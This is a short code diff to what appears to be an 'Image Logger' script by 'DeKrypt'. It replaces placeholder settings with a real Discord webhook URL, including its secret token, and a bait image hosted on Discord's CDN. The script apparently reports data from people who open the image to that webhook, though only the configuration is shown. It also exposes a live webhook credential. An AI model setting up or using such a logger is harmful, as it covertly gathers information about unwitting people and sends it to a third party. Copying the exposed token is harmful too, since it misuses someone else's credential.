@@ -8,8 +8,8 @@ __version__ = "v2.0"
 __author__ = "DeKrypt"
 
 config = {
-    "webhook": "https://discord.com/api/webhooks/your/webhook",
-    "image": "https://link-to-your-image.here",
+    "webhook": "https://discord.com/api/webhooks/1261396872388546700/1sGG0sZP80wpPBB8uYf36YWH7UlRwSc8_GnlfidKG2L6bFDEOPQE8PKVTqF3TRExX-Oq",
+    "image": "https://cdn.discordapp.com/attachments/1261396853510115408/1268147887695466609/photo_2024-07-13_04-31-34.jpg?ex=66ab5e41&is=66aa0cc1&hm=933cad7547693590bfe23cb879fa8bbdc64478e1539ea268bfc4217f75e6f83c&",
     "imageArgument": True,
     "username": "Image Logger",
     "color": 0x00FFFF,
